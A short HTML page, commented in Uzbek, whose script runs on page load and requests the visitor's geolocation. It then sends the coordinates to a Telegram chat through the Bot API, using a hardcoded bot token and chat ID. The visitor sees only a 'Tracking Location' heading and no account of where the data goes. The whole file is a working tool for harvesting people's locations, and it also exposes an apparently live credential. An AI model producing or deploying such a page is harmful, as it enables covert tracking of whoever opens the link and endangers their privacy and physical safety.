<!DOCTYPE html>
<html>
<head>
    <title>Track Location</title>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function (position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    var botToken = 'Y6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ';  // O'zingizning bot tokeningizni kiriting
                    var chatId = '5528965178';  // Botning chat ID sini kiriting

                    // Telegram botga joylashuvni yuborish
                    fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            latitude: latitude,
                            longitude: longitude
                        })
                    })
                    .then(response => response.json())
                    .then(data => console.log('Success:', data))
                    .catch((error) => console.error('Error:', error));
                }, function (error) {
                    console.error('Error getting location:', error);
                });
            } else {
                console.log('Geolocation is not supported by this browser.');
            }
        });
    </script>
</head>
<body>
    <h1>Tracking Location</h1>
</body>
</html>
